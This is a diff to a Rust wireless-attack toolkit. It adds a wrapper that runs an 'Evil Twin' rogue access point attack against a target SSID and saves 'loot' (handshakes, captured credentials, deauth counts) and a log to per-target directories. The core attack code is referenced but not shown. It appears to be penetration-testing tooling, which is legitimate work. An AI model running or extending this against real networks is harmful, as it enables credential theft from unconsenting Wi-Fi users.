@@ -16,11 +16,15 @@
 //! - hostapd for AP creation (or native beacon injection)
 
 use std::fs;
+use std::io::Write;
+use std::path::{Path, PathBuf};
 use std::process::{Child, Command, Stdio};
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
 use std::thread;
 use std::time::{Duration, Instant};
+
+use chrono::Local;
 
 use crate::deauth::{DeauthAttacker, DeauthConfig};
 use crate::error::{Result, WirelessError};
@@ -124,7 +128,8 @@ pub struct EvilTwinStats {
 /// Evil Twin attack controller
 pub struct EvilTwin {
     config: EvilTwinConfig,
-    stop_flag: Arc<AtomicBool>,
+    /// Stop flag for coordinating shutdown
+    pub stop_flag: Arc<AtomicBool>,
     hostapd_process: Option<Child>,
     dnsmasq_process: Option<Child>,
 }
@@ -601,6 +606,153 @@ pub fn quick_evil_twin(
     attack.start()
 }
 
+/// Evil Twin execution result with loot path
+#[derive(Debug, Clone)]
+pub struct EvilTwinResult {
+    /// Attack statistics
+    pub stats: EvilTwinStats,
+    /// Path where loot was saved
+    pub loot_path: PathBuf,
+    /// Log file path
+    pub log_path: PathBuf,
+}
+
+/// Execute Evil Twin attack with proper loot directory structure
+///
+/// # Arguments
+/// * `config` - Evil Twin configuration
+/// * `loot_base` - Base loot directory (default: "loot/Wireless")
+/// * `progress` - Callback for progress updates
+///
+/// # Returns
+/// Result containing attack stats and loot paths
+pub fn execute_evil_twin<F>(
+    config: EvilTwinConfig,
+    loot_base: Option<&str>,
+    progress: F,
+) -> Result<EvilTwinResult>
+where
+    F: Fn(&str) + Send + 'static,
+{
+    // Check requirements first
+    let missing = EvilTwin::check_requirements()?;
+    if !missing.is_empty() {
+        return Err(WirelessError::System(format!(
+            "Missing required tools: {}",
+            missing.join(", ")
+        )));
+    }
+
+    // Create loot directory structure: loot/Wireless/<ssid>/evil_twin/
+    let base = loot_base.unwrap_or("loot/Wireless");
+    let target_name = sanitize_filename(&config.ssid);
+    let timestamp = Local::now().format("%Y%m%d_%H%M%S").to_string();
+    let loot_dir = PathBuf::from(base)
+        .join(&target_name)
+        .join("evil_twin")
+        .join(&timestamp);
+
+    fs::create_dir_all(&loot_dir)
+        .map_err(|e| WirelessError::System(format!("Failed to create loot dir: {}", e)))?;
+
+    progress(&format!(
+        "Starting Evil Twin AP: {} on channel {}",
+        config.ssid, config.channel
+    ));
+
+    // Update config with our loot path
+    let mut attack_config = config.clone();
+    attack_config.capture_path = loot_dir.to_string_lossy().to_string();
+
+    // Create attack log
+    let log_path = loot_dir.join("attack.log");
+    let mut log_file = fs::File::create(&log_path)
+        .map_err(|e| WirelessError::System(format!("Failed to create log: {}", e)))?;
+
+    writeln!(log_file, "Evil Twin Attack Log").ok();
+    writeln!(log_file, "Started: {}", Local::now().format("%Y-%m-%d %H:%M:%S")).ok();
+    writeln!(log_file, "Target SSID: {}", config.ssid).ok();
+    writeln!(log_file, "Channel: {}", config.channel).ok();
+    writeln!(log_file, "AP Interface: {}", config.ap_interface).ok();
+    writeln!(
+        log_file,
+        "Mode: {}",
+        if config.open_network {
+            "Open (Captive Portal)"
+        } else {
+            "WPA2"
+        }
+    )
+    .ok();
+    if let Some(ref bssid) = config.target_bssid {
+        writeln!(log_file, "Target BSSID: {}", bssid).ok();
+    }
+    writeln!(log_file, "Duration: {:?}", config.duration).ok();
+    writeln!(log_file, "---").ok();
+
+    // Create and run attack
+    let mut attack = EvilTwin::new(attack_config);
+    let start = Instant::now();
+
+    // Monitor thread for progress updates
+    let stop_flag = Arc::clone(&attack.stop_flag);
+    let progress_ssid = config.ssid.clone();
+    let progress_thread = thread::spawn(move || {
+        let mut last_update = Instant::now();
+        while !stop_flag.load(Ordering::Relaxed) {
+            thread::sleep(Duration::from_secs(5));
+            if last_update.elapsed() >= Duration::from_secs(10) {
+                progress(&format!(
+                    "Evil Twin '{}' running for {:?}...",
+                    progress_ssid,
+                    start.elapsed()
+                ));
+                last_update = Instant::now();
+            }
+        }
+    });
+
+    // Run the attack
+    let stats = attack.start()?;
+
+    // Stop progress thread
+    attack.stop_flag.store(true, Ordering::Relaxed);
+    let _ = progress_thread.join();
+
+    // Log results
+    writeln!(log_file, "---").ok();
+    writeln!(log_file, "Attack completed").ok();
+    writeln!(log_file, "Duration: {:?}", stats.duration).ok();
+    writeln!(log_file, "Clients connected: {}", stats.clients_connected).ok();
+    writeln!(log_file, "Handshakes captured: {}", stats.handshakes_captured).ok();
+    writeln!(log_file, "Deauth packets sent: {}", stats.deauth_packets).ok();
+    writeln!(log_file, "Credentials captured: {}", stats.credentials_captured).ok();
+
+    progress(&format!(
+        "Evil Twin complete: {} clients connected, {} handshakes",
+        stats.clients_connected, stats.handshakes_captured
+    ));
+
+    Ok(EvilTwinResult {
+        stats,
+        loot_path: loot_dir,
+        log_path,
+    })
+}
+
+/// Sanitize filename for loot directory
+fn sanitize_filename(name: &str) -> String {
+    name.chars()
+        .map(|c| {
+            if c.is_alphanumeric() || c == '-' || c == '_' {
+                c
+            } else {
+                '_'
+            }
+        })
+        .collect()
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -621,5 +773,12 @@ mod tests {
     fn test_requirements_check() {
         // Just ensure it doesn't panic
         let _ = EvilTwin::check_requirements();
+    }
+
+    #[test]
+    fn test_sanitize_filename() {
+        assert_eq!(sanitize_filename("Test Network"), "Test_Network");
+        assert_eq!(sanitize_filename("WiFi@Home!"), "WiFi_Home_");
+        assert_eq!(sanitize_filename("normal-name_123"), "normal-name_123");
     }
 }
